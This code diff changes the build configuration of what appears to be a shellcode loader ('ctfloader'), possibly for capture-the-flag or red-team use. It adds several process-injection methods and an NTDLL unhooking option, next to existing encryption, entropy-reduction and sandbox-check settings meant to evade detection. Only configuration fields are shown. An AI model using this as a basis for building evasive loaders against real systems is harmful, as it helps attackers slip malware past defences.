@@ -11,13 +11,14 @@ class BuildConfig:
     mode: str = "staged"                    # "staged" or "stageless"
     payload_path: str = ""                  # Path to .bin shellcode
     format: str = "EXE"                     # "EXE" or "DLL"
-    inject_method: str = "apc"              # "apc" or "copyfile2"
+    inject_method: str = "apc"              # "apc", "copyfile2", "tp_direct", "wf_overwrite", "timerqueue"
     target_process: str = "RuntimeBroker.exe"  # APC target process
     output: str = "ctfloader"               # Output base name
 
     # Options
     encrypt: bool = False
     scramble: bool = False
+    unhook: bool = True              # NTDLL unhooking via Known DLLs
     entropy_reduction: bool = False
     sandbox_checks: bool = False     # pre-flight uptime/RAM/CPU checks
     sandbox_min_uptime_s: int = 300   # minimum system uptime in seconds
